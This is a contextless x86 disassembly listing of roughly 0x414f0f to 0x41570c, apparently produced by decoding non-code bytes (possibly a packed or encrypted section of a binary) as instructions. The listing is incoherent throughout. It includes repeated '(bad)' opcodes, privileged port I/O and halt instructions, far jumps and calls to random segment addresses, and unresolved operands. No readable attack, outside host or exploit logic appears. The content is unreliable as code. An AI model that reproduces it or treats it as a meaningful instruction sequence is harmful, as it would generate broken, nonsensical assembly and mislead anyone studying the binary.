  414f0f:	sbb    DWORD PTR [esi+edi*1],esi
  414f12:	xor    ebx,ecx
  414f14:	inc    eax
  414f15:	popa   
  414f16:	add    edx,DWORD PTR [esp+eax*8+0x584d1268]
  414f1d:	sti    
  414f1e:	adc    dl,0x78
  414f21:	adc    DWORD PTR [edi],eax
  414f23:	jmp    0xbaf3:0x9645ac57
  414f2a:	mov    WORD PTR [esi-0x549ce4b6],cs
  414f30:	(bad)  
  414f31:	fs jge 0x414fab
  414f34:	scas   al,BYTE PTR es:[edi]
  414f35:	adc    BYTE PTR [edx-0x40c9d349],cl
  414f3b:	outs   dx,DWORD PTR ds:[esi]
  414f3c:	jmp    0x81dd:0xe17830d7
  414f43:	inc    eax
  414f44:	stos   BYTE PTR es:[edi],al
  414f45:	jp     0x414f48
  414f47:	iret   
  414f48:	pushf  
  414f49:	shr    bl,0xe
  414f4c:	(bad)  
  414f4e:	or     bl,BYTE PTR ds:0xf4a761a6
  414f54:	pop    esp
  414f55:	push   cs
  414f56:	and    bl,BYTE PTR [edx+ebx*8]
  414f59:	cdq    
  414f5a:	mov    dh,0x79
  414f5c:	mov    ds:0xd37d2db3,eax
  414f61:	pop    eax
  414f62:	ror    DWORD PTR [ebx+0x3d904cb7],cl
  414f68:	push   edi
  414f69:	pop    ebx
  414f6a:	js     0x414f3d
  414f6c:	inc    eax
  414f6d:	and    DWORD PTR [ebx-0x68c5562],eax
  414f73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f74:	out    dx,eax
  414f75:	dec    edx
  414f76:	dec    esp
  414f77:	hlt    
  414f78:	xor    esi,0xffffffe6
  414f7b:	retf   
  414f7c:	adc    DWORD PTR [ecx-0x65],esp
  414f7f:	add    ah,ah
  414f81:	rcl    ebp,0x12
  414f84:	sbb    cl,BYTE PTR [ebp-0x64b34969]
  414f8a:	jo     0x414ff2
  414f8c:	mov    esp,0x58c52772
  414f91:	sbb    DWORD PTR [esi+0x21],ebx
  414f94:	in     al,0x8f
  414f96:	jb     0x414fb5
  414f98:	out    0x90,al
  414f9a:	mov    al,ds:0x87a6dc78
  414f9f:	inc    esp
  414fa0:	xchg   edi,eax
  414fa1:	cli    
  414fa2:	sub    bl,BYTE PTR [esi+ebp*2]
  414fa5:	gs and al,0xda
  414fa8:	aaa    
  414fa9:	mov    al,ds:0x6aced0de
  414fae:	mov    al,ds:0xbb22e8e4
  414fb3:	mov    eax,0x359847a1
  414fb8:	aad    0xfe
  414fba:	out    0x72,eax
  414fbc:	ret    
  414fbd:	xchg   ebx,eax
  414fbe:	inc    edx
  414fbf:	jne    0x414f4f
  414fc1:	repz xchg edx,eax
  414fc3:	mov    ch,0xfd
  414fc5:	sub    BYTE PTR [edi-0x48191e86],cl
  414fcb:	sar    DWORD PTR [esi+0x6f885e1d],0x7d
  414fd2:	jl     0x414f90
  414fd4:	push   0x57e8dbf3
  414fd9:	repz sub eax,0x526a7fb6
  414fdf:	jb     0x414f8f
  414fe1:	sub    esi,DWORD PTR [ebx+0x438bb48]
  414fe7:	xor    edi,edi
  414fe9:	addr16 jb 0x414fd6
  414fec:	scas   al,BYTE PTR es:[edi]
  414fed:	xadd   ch,bh
  414ff0:	pop    ds
  414ff1:	sub    al,0x9c
  414ff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ff4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ff5:	shr    DWORD PTR [esi-0x12],1
  414ff8:	mov    ebx,0xfa880131
  414ffd:	(bad)  
  414ffe:	pop    eax
  414fff:	aad    0x2f
  415001:	jns    0x415027
  415003:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415005:	inc    ebx
  415006:	test   DWORD PTR [edx+0x73],0xac86bda
  41500d:	push   ecx
  41500e:	cs aaa 
  415010:	aad    0x23
  415012:	dec    ebx
  415013:	mov    ds:0x4a829084,al
  415018:	in     al,dx
  415019:	nop
  41501a:	mov    ch,0x1
  41501c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41501d:	ins    BYTE PTR es:[edi],dx
  41501e:	(bad)  
  41501f:	cmc    
  415020:	jae    0x41505f
  415022:	mov    eax,0xf7d5ba43
  415027:	test   eax,0xb3d936f3
  41502c:	mov    eax,0x10c88ce3
  415031:	or     al,0x36
  415033:	mov    ah,0x33
  415035:	mul    BYTE PTR [esi-0x68]
  415038:	int    0x15
  41503a:	jl     0x414fe8
  41503c:	dec    ebp
  41503d:	int3   
  41503e:	sub    al,BYTE PTR [eax]
  415040:	je     0x41505a
  415042:	das    
  415043:	add    DWORD PTR [eax+ebx*1-0x5abde4df],0xffffff86
  41504b:	and    BYTE PTR [edx-0x3f],cl
  41504e:	push   eax
  41504f:	hlt    
  415050:	data16 xchg BYTE PTR [esi+0x32],cl
  415054:	push   0x7a
  415056:	outs   dx,BYTE PTR ds:[esi]
  415057:	leave  
  415058:	jg     0x415052
  41505a:	jne    0x4150ab
  41505c:	sbb    BYTE PTR [ebp+eax*1+0x24431596],0x19
  415064:	or     eax,0x8790e6d6
  415069:	fcmovne st,st(7)
  41506b:	retf   0xd188
  41506e:	std    
  41506f:	mov    eax,ds:0x228f7eef
  415074:	jg     0x415099
  415076:	call   DWORD PTR [esi+0x7a]
  415079:	std    
  41507a:	loope  0x4150ec
  41507c:	scas   eax,DWORD PTR es:[edi]
  41507d:	add    BYTE PTR [ebp+ebp*8+0x2f670f85],ch
  415084:	cmp    al,0xc8
  415086:	xchg   esp,eax
  415087:	pop    ebp
  415088:	mov    bl,0xb0
  41508a:	shl    BYTE PTR [ecx+0x390879a3],0x57
  415091:	mov    edx,0xe45678b8
  415096:	stc    
  415097:	add    ch,dh
  415099:	pop    ebp
  41509a:	xor    eax,0xad213215
  41509f:	push   ds
  4150a0:	mov    al,ds:0x2f7b309
  4150a5:	jecxz  0x415123
  4150a7:	mov    ebp,0x92f4d8c7
  4150ac:	sahf   
  4150ad:	out    0xbf,eax
  4150af:	jo     0x415036
  4150b1:	ja     0x415117
  4150b3:	and    esi,DWORD PTR [eax+0x479bd1a1]
  4150b9:	push   ebp
  4150ba:	retf   0xd60f
  4150bd:	push   0x68d5ddfb
  4150c2:	in     al,0x3f
  4150c4:	les    ebx,FWORD PTR [eax+0x580e1fd7]
  4150ca:	ins    DWORD PTR es:[edi],dx
  4150cb:	jg     0x415076
  4150cd:	call   0xe71a:0xea6942fe
  4150d4:	mov    dl,0xc7
  4150d6:	lea    ecx,[esp+edi*4]
  4150d9:	cmp    bh,cl
  4150db:	xor    ebp,ebp
  4150dd:	mov    ch,0x23
  4150df:	push   ebp
  4150e0:	add    al,0x6f
  4150e2:	enter  0x9ee9,0x60
  4150e6:	mov    al,0x91
  4150e8:	cmp    BYTE PTR [ebx-0x351d21dc],dl
  4150ee:	dec    ebx
  4150ef:	adc    DWORD PTR [edi],ebp
  4150f1:	ret    
  4150f2:	dec    eax
  4150f3:	adc    eax,0x6973693d
  4150f8:	xchg   ebp,eax
  4150f9:	jb     0x415165
  4150fb:	xchg   esi,eax
  4150fc:	inc    edx
  4150fd:	pop    ss
  4150fe:	pop    eax
  4150ff:	cwde   
  415100:	imul   eax,ebx,0xffffffbc
  415103:	sub    ebp,ecx
  415105:	dec    edi
  415106:	fld1   
  415108:	mov    esi,0x64ae0087
  41510d:	aad    0x7b
  41510f:	xchg   edi,eax
  415110:	sbb    BYTE PTR ds:0xe14611a1,ch
  415116:	test   BYTE PTR [ecx+eax*1],cl
  415119:	adc    eax,0xfb01010c
  41511e:	xchg   edi,eax
  41511f:	in     al,0x68
  415121:	leave  
  415122:	mov    BYTE PTR [esi],bl
  415124:	xchg   edx,eax
  415125:	hlt    
  415126:	cmp    BYTE PTR [edi*8+0x5c2779a7],ah
  41512d:	inc    esi
  41512e:	pop    ebp
  41512f:	js     0x415130
  415131:	jg     0x41514c
  415133:	xchg   edi,eax
  415134:	pushf  
  415135:	sbb    BYTE PTR [edx],dh
  415137:	push   esi
  415138:	dec    edi
  415139:	test   al,0xeb
  41513b:	lock sub bl,ah
  41513e:	pop    ebx
  41513f:	push   edi
  415140:	inc    esi
  415141:	mov    bl,0x79
  415143:	xchg   ebp,eax
  415144:	out    0x44,eax
  415146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415147:	ror    DWORD PTR [edx],cl
  415149:	mov    ebx,0xa7e67854
  41514e:	dec    ecx
  41514f:	push   ss
  415150:	sbb    ebp,DWORD PTR ds:0x1390856a
  415156:	test   DWORD PTR [edi+0x6e],ebp
  415159:	fld    QWORD PTR [esi]
  41515b:	jl     0x415182
  41515d:	mov    esi,0x233cdeff
  415162:	ret    0x32b4
  415165:	sub    eax,0x63ce00bb
  41516a:	stc    
  41516b:	xchg   WORD PTR [esi-0x63],ax
  41516f:	mov    al,0x87
  415171:	adc    eax,0x49e7634c
  415176:	inc    edi
  415177:	(bad)  
  415178:	push   ebx
  415179:	inc    esi
  41517a:	push   ecx
  41517b:	data16 adc al,0xa1
  41517e:	adc    eax,0x6afd889b
  415183:	ja     0x41516c
  415185:	cld    
  415186:	xchg   ebp,eax
  415187:	adc    DWORD PTR [eax-0x5f],esp
  41518a:	adc    DWORD PTR [edx-0x3c152614],eax
  415190:	or     eax,0x2cee8cd4
  415195:	pop    esp
  415196:	fldcw  WORD PTR [ebp+0x38]
  415199:	inc    eax
  41519a:	sub    edi,esi
  41519c:	shl    BYTE PTR [esi-0x5c],1
  41519f:	not    DWORD PTR [edi+0x20a94698]
  4151a5:	jmp    0x4151f5
  4151a7:	xchg   ebx,eax
  4151a8:	push   es
  4151a9:	dec    ebx
  4151aa:	adc    al,dl
  4151ac:	xchg   DWORD PTR [bx+si],esp
  4151af:	dec    ecx
  4151b0:	aaa    
  4151b1:	test   al,0xfe
  4151b3:	push   ds
  4151b4:	jmp    0xd3b1014
  4151b9:	bound  ebx,QWORD PTR [edx+eax*8]
  4151bc:	stos   DWORD PTR es:[edi],eax
  4151bd:	imul   ebp,DWORD PTR [ecx-0x80],0xffffffdb
  4151c1:	or     eax,0x7b373d24
  4151c6:	mov    bh,0xe7
  4151c8:	ficom  WORD PTR [edi]
  4151ca:	add    eax,0xf06dcdc3
  4151cf:	shl    BYTE PTR [esi],1
  4151d1:	mov    eax,0xec66e5d7
  4151d6:	pop    eax
  4151d7:	push   ebx
  4151d8:	push   es
  4151d9:	std    
  4151da:	fstp   st(7)
  4151dd:	stos   DWORD PTR es:[edi],eax
  4151de:	or     al,0x6d
  4151e0:	pop    edx
  4151e1:	jge    0x41520e
  4151e3:	mov    ebp,0xc6856c3f
  4151e8:	add    DWORD PTR [edx],edx
  4151ea:	sub    BYTE PTR [edx+edx*2-0x6f6ab3ab],0x59
  4151f2:	ficomp DWORD PTR [ebp-0x5b]
  4151f5:	xor    edi,DWORD PTR [ebx]
  4151f7:	add    eax,0xffea39dc
  4151fc:	cmp    al,0x7
  4151fe:	dec    eax
  4151ff:	add    eax,0x824222fc
  415204:	and    esi,DWORD PTR [edi+0x5e]
  415207:	jmp    0x4151e0
  415209:	rcr    DWORD PTR [ebx-0x44cb3ada],0x33
  415210:	add    al,0xc7
  415212:	jecxz  0x41524f
  415214:	inc    ebp
  415215:	or     DWORD PTR ss:[edx-0x3517f86],eax
  41521c:	add    BYTE PTR [ebx+eiz*8],bl
  41521f:	mov    ch,0x7b
  415221:	sub    al,0x19
  415223:	push   ebp
  415224:	dec    bh
  415226:	mov    ss,WORD PTR [ecx+ebx*2-0x27acaa13]
  41522d:	pop    eax
  41522e:	add    edx,DWORD PTR [eax+ebx*8]
  415231:	bound  esi,QWORD PTR [edi+0x4277134e]
  415237:	add    al,0xe5
  415239:	xor    BYTE PTR [ebx+0x288705be],al
  41523f:	mov    ds:0x9e478151,al
  415244:	mov    esp,0x924f53c3
  415249:	adc    bh,ah
  41524b:	jns    0x4152b6
  41524d:	fwait
  41524e:	mov    ah,0x7d
  415250:	cld    
  415251:	lahf   
  415252:	inc    ebp
  415253:	inc    ebx
  415254:	dec    eax
  415255:	ss xchg esi,eax
  415257:	stos   BYTE PTR es:[edi],al
  415258:	jb     0x4151eb
  41525a:	ds sbb eax,0x6ed95c71
  415260:	icebp  
  415261:	jbe    0x41524a
  415263:	mov    ebp,0xf43c2a43
  415268:	int3   
  415269:	inc    edi
  41526a:	das    
  41526b:	cmp    DWORD PTR [edi-0x157357da],edi
  415271:	mov    edi,0x6470bbdd
  415276:	(bad)  
  415277:	adc    eax,0x2cdbbe8c
  41527c:	mov    ebp,0xff8a8528
  415281:	fiadd  DWORD PTR [ecx-0x7a]
  415284:	xor    cl,bl
  415286:	push   cs
  415287:	sub    BYTE PTR [edx+edx*2],0xe3
  41528b:	or     al,0x3e
  41528d:	sbb    eax,0x40a6e7fb
  415292:	adc    edx,DWORD PTR [ebx-0x33]
  415295:	inc    esi
  415296:	adc    eax,DWORD PTR [edi*4-0x543a1423]
  41529d:	nop
  41529e:	(bad)  
  41529f:	ficomp DWORD PTR [ebp+0x49be7ab5]
  4152a5:	sbb    eax,0xc2ed8a99
  4152aa:	mov    edi,0x95020d33
  4152af:	jnp    0x41532b
  4152b1:	out    0xa1,al
  4152b3:	sbb    DWORD PTR [edi+ebx*8-0x591e3d7f],edx
  4152ba:	mov    ebp,0xed8538af
  4152bf:	into   
  4152c0:	out    0x2a,eax
  4152c2:	jno    0x415301
  4152c4:	shl    ebp,1
  4152c6:	adc    dh,BYTE PTR ds:0x16482f82
  4152cc:	push   eax
  4152cd:	cmp    eax,0x9dc40770
  4152d2:	dec    bp
  4152d4:	push   edx
  4152d5:	inc    ecx
  4152d6:	add    al,0xf2
  4152d8:	mov    esi,0x92434ed4
  4152dd:	sbb    DWORD PTR [edi+0x1],0x31
  4152e1:	mov    edx,0x2c6199c1
  4152e6:	mov    bh,0x24
  4152e8:	adc    BYTE PTR [edi-0x52c427e6],ah
  4152ee:	push   ecx
  4152ef:	adc    eax,ecx
  4152f1:	loopne 0x4152a3
  4152f3:	sbb    al,0xa7
  4152f5:	inc    ebp
  4152f6:	mov    dl,cl
  4152f8:	cmp    al,0x58
  4152fa:	mov    esp,0x9fd206fe
  4152ff:	push   esi
  415300:	mov    WORD PTR [eax],?
  415302:	arpl   WORD PTR [ecx+0x46],di
  415305:	fimul  WORD PTR [eax]
  415307:	sub    eax,0x16242c1e
  41530c:	jle    0x415317
  41530e:	test   eax,0xb5be0896
  415313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415314:	mov    ebx,0xecf154d4
  415319:	lods   al,BYTE PTR ds:[esi]
  41531a:	and    ecx,ebx
  41531c:	jns    0x4152cf
  41531e:	daa    
  41531f:	(bad)  
  415320:	sub    DWORD PTR es:[esi],esp
  415323:	cwde   
  415324:	or     al,0x89
  415326:	lds    eax,FWORD PTR [esi+0x4457faaf]
  41532c:	mov    ds:0x76814e16,eax
  415331:	mov    dh,0x5e
  415333:	arpl   WORD PTR [edi-0x7fba5df7],cx
  415339:	ret    
  41533a:	lods   al,BYTE PTR ds:[esi]
  41533b:	adc    DWORD PTR [ebx-0x100cec6],ecx
  415341:	div    BYTE PTR [ecx-0x1]
  415344:	repz and ecx,edi
  415347:	xchg   esp,eax
  415348:	imul   ebp,edi,0xfffffffd
  41534b:	inc    ecx
  41534c:	jl     0x4153b5
  41534e:	adc    edi,DWORD PTR [edi-0x124c71de]
  415354:	outs   dx,BYTE PTR ds:[esi]
  415355:	adc    dl,ah
  415357:	and    al,0x45
  415359:	xchg   edi,eax
  41535a:	sub    eax,0x8523110c
  41535f:	ss stc 
  415361:	fisttp DWORD PTR [esi+0x4b9340ab]
  415367:	enter  0x7f5a,0x91
  41536b:	adc    ecx,edx
  41536d:	push   cs
  41536e:	test   eax,ebp
  415370:	cli    
  415371:	dec    edx
  415372:	pop    eax
  415373:	xchg   edi,eax
  415374:	inc    esp
  415375:	mov    WORD PTR [edi],ss
  415377:	int    0x9f
  415379:	addr16 or eax,0x7d
  41537d:	adc    BYTE PTR [edi],dl
  41537f:	jmp    0x4153fa
  415381:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415382:	sahf   
  415383:	sbb    esp,edx
  415385:	out    0x2d,eax
  415387:	je     0x415406
  415389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41538a:	dec    esp
  41538b:	neg    al
  41538d:	outs   dx,BYTE PTR ds:[esi]
  41538e:	add    DWORD PTR [ecx+ebx*8-0x13f83de2],0xffffffac
  415396:	es into 
  415398:	sub    edi,ecx
  41539a:	sub    ecx,DWORD PTR [edi]
  41539c:	std    
  41539d:	in     al,dx
  41539e:	out    0xee,eax
  4153a0:	jns    0x4153ee
  4153a2:	xchg   ebx,eax
  4153a3:	jl     0x41535e
  4153a5:	cmp    eax,0xa0162694
  4153aa:	jb     0x4153d9
  4153ac:	cmp    DWORD PTR ds:0xa10d598d,ebp
  4153b2:	mov    edi,DWORD PTR [ecx+esi*8]
  4153b5:	nop
  4153b6:	outs   dx,BYTE PTR ds:[esi]
  4153b7:	les    eax,FWORD PTR [ebx]
  4153b9:	sub    DWORD PTR [eax],esi
  4153bb:	mov    bl,0x46
  4153bd:	push   cs
  4153be:	ds aam 0xb7
  4153c1:	stos   DWORD PTR es:[edi],eax
  4153c2:	popa   
  4153c3:	mov    esi,0xe8cdff61
  4153c8:	inc    edx
  4153c9:	ja     0x4153ad
  4153cb:	push   0x14
  4153cd:	imul   edx,ebp,0x810a10ef
  4153d3:	jo     0x415425
  4153d5:	cli    
  4153d6:	dec    edx
  4153d7:	pop    edi
  4153d8:	mov    ds:0xbd16e07d,eax
  4153dd:	and    ebx,DWORD PTR [ebx+0x57]
  4153e0:	push   es
  4153e1:	ret    
  4153e2:	mov    DWORD PTR [edi+edx*4-0x3e],ebp
  4153e6:	fsub   DWORD PTR [eax]
  4153e8:	imul   esi,ecx,0xffffff81
  4153eb:	out    0xb3,al
  4153ed:	fadd   DWORD PTR [esi+0x49]
  4153f0:	out    0x6a,eax
  4153f2:	pushf  
  4153f3:	loope  0x4153ca
  4153f5:	sahf   
  4153f6:	pop    edi
  4153f7:	aas    
  4153f8:	retf   
  4153f9:	pop    esp
  4153fa:	jb     0x41544f
  4153fc:	retf   0xd60e
  4153ff:	push   esi
  415400:	dec    esi
  415401:	dec    ebx
  415402:	pop    esi
  415403:	popf   
  415404:	dec    eax
  415405:	hlt    
  415406:	dec    eax
  415407:	(bad)  
  415408:	bound  eax,QWORD PTR [ebp+0x59]
  41540b:	push   es
  41540c:	jo     0x4153c1
  41540e:	imul   ebx,DWORD PTR [eax+0x1ca22390],0x9dd4bb33
  415418:	mov    ah,0x1c
  41541a:	mov    dl,dl
  41541c:	mov    dl,0x3b
  41541e:	loopne 0x41547a
  415420:	add    bl,BYTE PTR [ebp-0x37]
  415423:	push   ebp
  415424:	rcr    DWORD PTR [esp+esi*8-0x6],1
  415428:	or     bl,dh
  41542a:	cvtpi2ps xmm2,QWORD PTR [eax+esi*4-0x44fc963c]
  415432:	enter  0xe8b8,0x3b
  415436:	jb     0x4154b3
  415438:	mov    esp,esp
  41543a:	jmp    0x173d57bd
  41543f:	pop    ss
  415440:	int3   
  415441:	xchg   ebp,eax
  415442:	mov    ebx,0x2f0f955a
  415447:	fistp  DWORD PTR ds:0xc3717065
  41544d:	ins    BYTE PTR es:[edi],dx
  41544e:	push   ds
  41544f:	test   eax,0xf597d2c6
  415454:	cli    
  415455:	test   DWORD PTR [edi-0x4],esp
  415458:	retf   0x9014
  41545b:	call   FWORD PTR [esi+0x4924d270]
  415461:	addr16 jg 0x4154b4
  415464:	mov    bl,0x73
  415466:	enter  0x5492,0xe4
  41546a:	add    eax,0x199159bf
  41546f:	mov    ecx,0xc17458b3
  415474:	rcl    esi,0x33
  415477:	outs   dx,BYTE PTR ds:[esi]
  415478:	outs   dx,DWORD PTR ds:[esi]
  415479:	xchg   DWORD PTR [esp+ecx*2+0x7365082c],ebx
  415480:	repnz call 0x1e1b:0xaa7d00c2
  415488:	jnp    0x4154f4
  41548a:	add    al,0xca
  41548c:	sub    al,0x8c
  41548e:	gs rcr dl,cl
  415491:	pop    ebp
  415492:	and    bl,cl
  415494:	push   ebx
  415495:	popf   
  415496:	push   ds
  415497:	xlat   BYTE PTR ds:[ebx]
  415498:	dec    ebp
  415499:	pop    edx
  41549a:	pop    eax
  41549b:	dec    ebx
  41549c:	jge    0x41551b
  41549e:	aad    0xe3
  4154a0:	shl    BYTE PTR [ecx+0xdc8bf00],cl
  4154a6:	and    DWORD PTR [ebx],ecx
  4154a8:	dec    DWORD PTR [ebp-0x1c35511f]
  4154ae:	shl    BYTE PTR [edx-0x59],0xe0
  4154b2:	test   DWORD PTR [ebp-0x45a4182],esi
  4154b8:	out    dx,eax
  4154b9:	repnz in eax,dx
  4154bb:	cmp    al,cl
  4154bd:	xchg   ebp,eax
  4154be:	pop    esp
  4154bf:	out    0x1a,eax
  4154c1:	sbb    eax,0x934fc3f8
  4154c6:	loopne 0x41550e
  4154c8:	adc    DWORD PTR [eax],0xba7167f
  4154ce:	aas    
  4154cf:	and    ch,bh
  4154d1:	stos   DWORD PTR es:[edi],eax
  4154d2:	jge    0x41551f
  4154d4:	push   cs
  4154d5:	mov    dh,0xff
  4154d7:	pop    ebx
  4154d8:	cmp    DWORD PTR [ebx],ebx
  4154da:	js     0x41555b
  4154dc:	das    
  4154dd:	and    cl,ch
  4154df:	mov    ds:0xb61dc78e,al
  4154e4:	xor    edi,DWORD PTR [ebp+eiz*1+0x76]
  4154e8:	pushf  
  4154e9:	push   edi
  4154ea:	repnz pop ds
  4154ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154ed:	lea    edx,[ecx-0x3d042f8d]
  4154f3:	push   edx
  4154f4:	fist   WORD PTR [edi+0x1c5e2c2b]
  4154fa:	and    cl,dh
  4154fc:	int3   
  4154fd:	push   eax
  4154fe:	aad    0x66
  415500:	imul   ecx,DWORD PTR [edi],0xffffff94
  415503:	lock cs int 0xf2
  415507:	mov    bl,0x3c
  415509:	add    BYTE PTR [edi+0x5a],0xdc
  41550d:	popf   
  41550e:	jmp    0xfb6564a2
  415513:	jg     0x4154cf
  415515:	sbb    ecx,0x4a
  415518:	bound  ecx,QWORD PTR [ebx+0x4c729601]
  41551e:	mov    ebp,0x968c9ea5
  415523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415524:	ret    0x827e
  415527:	jne    0x415525
  415529:	out    dx,eax
  41552a:	xor    al,0xf5
  41552c:	stc    
  41552d:	or     eax,0x82c4c10c
  415532:	(bad)  
  415533:	mov    ch,0xd4
  415535:	call   DWORD PTR [edi]
  415537:	xor    eax,0xf824781a
  41553c:	(bad)  
  41553d:	jns    0x41555b
  41553f:	pusha  
  415540:	push   eax
  415541:	lock je 0x4155a1
  415544:	push   ss
  415545:	xchg   ebp,eax
  415546:	xchg   edx,eax
  415547:	push   es
  415548:	pop    edi
  415549:	add    BYTE PTR ds:0x559cf71,cl
  41554f:	aad    0xf3
  415551:	dec    eax
  415552:	call   0x69caea02
  415557:	xor    dl,BYTE PTR [eax-0x7b35eee9]
  41555d:	cmp    al,0xa6
  41555f:	clc    
  415560:	int    0xe2
  415562:	cmc    
  415563:	(bad)  
  415564:	(bad)  
  415565:	lock sbb BYTE PTR [ebx-0x5b],0x6b
  41556a:	aad    0x7f
  41556c:	aam    0x4
  41556e:	sbb    dh,BYTE PTR [esp+esi*1-0x40e1ff29]
  415575:	test   DWORD PTR [ecx-0x361bbc51],ecx
  41557b:	scas   eax,DWORD PTR es:[edi]
  41557c:	cs jecxz 0x4155b1
  41557f:	sbb    eax,0x7da65f8e
  415584:	dec    edx
  415585:	loope  0x4155ab
  415587:	sub    DWORD PTR [ebx+0x1fb89343],esp
  41558d:	add    BYTE PTR [edi-0x22a4035d],ch
  415593:	xchg   esi,eax
  415594:	or     DWORD PTR [ecx+0x44c9b07f],ebp
  41559a:	fs sbb ecx,ebx
  41559d:	sbb    ch,cl
  41559f:	outs   dx,BYTE PTR ds:[esi]
  4155a0:	sbb    al,0x6b
  4155a2:	jno    0x415610
  4155a4:	push   edx
  4155a5:	sbb    eax,0x54f377f3
  4155aa:	test   esi,ebp
  4155ac:	in     al,dx
  4155ad:	adc    eax,0xeccdaa0
  4155b2:	fnstcw WORD PTR [edx-0x5d]
  4155b5:	mov    BYTE PTR [edx+0x3dcf74cb],ch
  4155bb:	adc    al,0xc6
  4155bd:	mov    WORD PTR [ecx+ecx*2-0x12ecb611],?
  4155c4:	xchg   cl,bh
  4155c6:	adc    eax,0x7666958
  4155cb:	add    esp,DWORD PTR gs:[ecx+eiz*8+0x6b]
  4155d0:	push   ecx
  4155d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155d2:	pop    edi
  4155d3:	cmp    eax,0x4558abcb
  4155d8:	xchg   ebp,eax
  4155d9:	cmc    
  4155da:	jno    0x415626
  4155dc:	mul    BYTE PTR [ebp+0x32]
  4155df:	mov    esi,DWORD PTR [edx]
  4155e1:	js     0x41560a
  4155e3:	(bad)  
  4155e4:	jbe    0x415570
  4155e6:	push   eax
  4155e7:	sti    
  4155e8:	pushf  
  4155e9:	stc    
  4155ea:	mov    ch,0x40
  4155ec:	cwde   
  4155ed:	rcl    BYTE PTR [esi+0x2cb29807],1
  4155f3:	(bad)  
  4155f4:	cli    
  4155f5:	in     eax,dx
  4155f6:	daa    
  4155f7:	mov    ss,WORD PTR [eax+0x59db4de9]
  4155fd:	mov    edx,0x44b4c51c
  415602:	sti    
  415603:	ja     0x415683
  415605:	sahf   
  415606:	xor    DWORD PTR [esi],ebp
  415608:	repnz dec ebp
  41560a:	(bad)  
  41560b:	and    DWORD PTR ds:0x66dcdf7d,0xffffffad
  415612:	repnz (bad) 
  415614:	xchg   BYTE PTR [edi+edx*1],bh
  415617:	fnsave [ecx-0x7a]
  41561a:	adc    ecx,DWORD PTR [ecx+0xd2518dd]
  415620:	xor    al,0x33
  415622:	push   esi
  415623:	daa    
  415624:	mov    bh,0xed
  415626:	out    dx,al
  415627:	rol    edi,0xd1
  41562a:	sbb    al,0xc5
  41562c:	xchg   ebx,eax
  41562d:	push   cs
  41562e:	(bad)  
  41562f:	int3   
  415630:	pop    edx
  415631:	sbb    DWORD PTR [ebx],ebx
  415633:	fwait
  415634:	pop    eax
  415635:	pop    edx
  415636:	in     eax,dx
  415637:	repz bound ebp,QWORD PTR [ebx+0x50]
  41563b:	inc    ecx
  41563c:	xor    DWORD PTR [eax],0xffffffc7
  41563f:	pop    eax
  415640:	add    eax,0xf37b37c5
  415645:	push   eax
  415646:	jmp    0x41561b
  415648:	push   esi
  415649:	jmp    0x233f:0xc331c8f4
  415650:	jle    0x415690
  415652:	fcom   DWORD PTR ds:0x3ccc5f42
  415658:	push   0xfffffff5
  41565a:	call   DWORD PTR [ebx+0x2634427d]
  415660:	pop    ds
  415661:	push   edi
  415662:	sub    eax,0x9a980bfb
  415667:	clc    
  415668:	xchg   edi,ebp
  41566a:	js     0x415625
  41566c:	lea    esp,[eax+eiz*4]
  41566f:	pop    esi
  415670:	lock mov db4,ebp
  415674:	sub    eax,0x3e138624
  415679:	push   0x1b33add7
  41567e:	xchg   ebp,eax
  41567f:	mov    dh,0x97
  415681:	xchg   ebp,eax
  415682:	fdivr  st(7),st
  415684:	retf   0x2545
  415687:	cmp    DWORD PTR [esi],eax
  415689:	call   0x15e5:0xf7355610
  415690:	push   eax
  415691:	pusha  
  415692:	shr    DWORD PTR [edx],0x30
  415695:	mov    WORD PTR [esi],gs
  415697:	fucomp st(1)
  415699:	lods   eax,DWORD PTR ds:[esi]
  41569a:	and    BYTE PTR [edi+esi*1-0x2db9233c],0xc
  4156a2:	cmp    al,0x80
  4156a4:	sbb    BYTE PTR [esi-0x4d1a9964],0x64
  4156ab:	cmp    al,0x4f
  4156ad:	xchg   BYTE PTR [ebx-0x20],dh
  4156b0:	mov    dh,0x7b
  4156b2:	push   edi
  4156b3:	xor    edx,DWORD PTR [ecx+0xc51282e]
  4156b9:	jnp    0x415645
  4156bb:	adc    edx,ecx
  4156bd:	stos   BYTE PTR es:[edi],al
  4156be:	xor    al,dh
  4156c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156c1:	pop    esi
  4156c2:	scas   eax,DWORD PTR es:[edi]
  4156c3:	je     0x4156de
  4156c5:	out    0xaa,al
  4156c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156c8:	and    eax,0xca5365c
  4156cd:	loope  0x4156d8
  4156cf:	sbb    BYTE PTR [eax-0x7220da8f],dl
  4156d5:	stos   DWORD PTR es:[edi],eax
  4156d6:	bound  ebp,QWORD PTR [ebx+0x7f]
  4156d9:	cmp    BYTE PTR [ebp+eax*1-0x1686a4f9],ch
  4156e0:	gs (bad) 
  4156e2:	xor    al,0xc7
  4156e4:	xor    dh,cl
  4156e6:	pop    ss
  4156e7:	pusha  
  4156e8:	fild   WORD PTR [ebp-0x7e]
  4156eb:	xchg   ecx,eax
  4156ec:	sti    
  4156ed:	sti    
  4156ee:	fwait
  4156ef:	bound  eax,QWORD PTR [eax]
  4156f1:	lods   eax,DWORD PTR ds:[esi]
  4156f2:	loope  0x41567e
  4156f4:	iret   
  4156f5:	push   edi
  4156f6:	adc    al,0x5f
  4156f8:	in     al,0xa4
  4156fa:	call   0xb58a:0x950eabca
  415701:	fs xchg edx,eax
  415703:	ins    BYTE PTR es:[edi],dx
  415704:	pop    esi
  415705:	cwde   
  415706:	repz push esi
  415708:	sbb    edx,esi
  41570a:	inc    eax
  41570b:	stos   DWORD PTR es:[edi],eax
  41570c:	and    al,0x9c
